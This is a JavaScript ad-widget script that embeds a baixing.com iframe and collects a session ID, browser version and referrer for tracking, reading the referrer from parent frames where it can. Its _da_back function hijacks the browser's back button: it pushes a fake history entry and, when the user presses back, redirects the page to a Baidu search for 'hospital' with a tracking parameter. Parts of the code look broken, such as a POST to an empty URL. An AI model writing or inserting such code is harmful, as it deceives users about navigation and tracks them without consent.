(function () {
    try {
        var insertPoint;
        if (document.currentScript) {
            insertPoint = document.currentScript
        } else {
            var phid = "w_" + Math.random().toString(36).slice(2);
            document.write('<div id="' + phid + '" style="display:none"></div>');
            insertPoint = document.getElementById(phid)
        }
        var iframe = document.createElement("iframe");
        iframe.setAttribute("src", "//tu.baixing.com/widget/w/hy-ry01.html?autosize=1");
        iframe.width = "100%";
        iframe.height = (window.innerWidth || window.screen.width) / (320 / 80);
        iframe.setAttribute("frameborder", 0);
        iframe.id = "hy-ry01";
        iframe.scrolling = "no";
        iframe.style.display = "block";
        insertPoint.parentNode.insertBefore(iframe, insertPoint)
    } catch (e) {
        (new Image).src = "//www.baixing.com/c/ev/bxad?action=adwidget-err&mes=" + encodeURIComponent(e.stack)
    }
    loadJson()
})();

function loadJson() {
    _da_back("1212")
    var xmlhttp = new XMLHttpRequest();
    var data = {
        uid: guid(),
        device: navigator.appVersion,
        referrer: getUrl(),
        channel_id: "",
        type: 1,
        time: (new Date()).valueOf()
    };
    console.log(data);
    console.log(window.location.href);
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState === 4 && xmlhttp.status === 200) {
            if (xmlhttp.response.data.title) {
            }
        }
    };
    xmlhttp.open("POST", "", true);
    xmlhttp.setRequestHeader("Content-type", "application/json;charset=UTF-8");
    xmlhttp.send(data)
    _da_back("1212")
}

function _da_back(title) {
    var back = window.sessionStorage.getItem("_da_back");
    window.sessionStorage.removeItem("_da_back");
    if (back == null) {
        var state = {title: "title", url: "#"};
        window.history.pushState(state, "title", "#");
        window.addEventListener("popstate", function (e) {
            window.sessionStorage.setItem("_da_back", "_da_back_da_back");
            window.parent.location.href = "https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=0&rsv_idx=1&tn=baiduerr&wd=%E5%8C%BB%E9%99%A2&rsv_pq=9bee1dda000944fe&rsv_t=da3a2xQvtjdA8PTDK6mQumTHpNf8Pkiqc%2Bo4Ya28wE2iwuOsajmDzKx8NpqPIsU&rqlang=cn&rsv_enter=1&rsv_sug2=0&inputT=5154&rsv_sug4=5405"
        }, false)
    }
}

function getUrl() {
    var url = "";
    try {
        url = window.top.document.referrer
    } catch (M) {
        if (window.parent) {
            try {
                url = window.parent.document.referrer
            } catch (L) {
                url = ""
            }
        }
    }
    if (url === "") {
        url = document.referrer
    }
    return url
}

function guid() {
    function S4() {
        return (((1 + Math.random()) * 65536) | 0).toString(16).substring(1)
    }

    function setUid() {
        return (S4() + S4() + "-" + S4() + "-" + S4() + "-" + S4() + "-" + S4() + S4() + S4())
    }

    var _da_uid = window.sessionStorage.getItem("_da_uid");
    if (_da_uid == null) {
        _da_uid = setUid();
        window.sessionStorage.setItem("_da_uid", _da_uid)
    }
    return _da_uid
};
